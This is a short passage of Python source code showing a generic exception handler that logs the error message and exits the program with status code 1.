    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
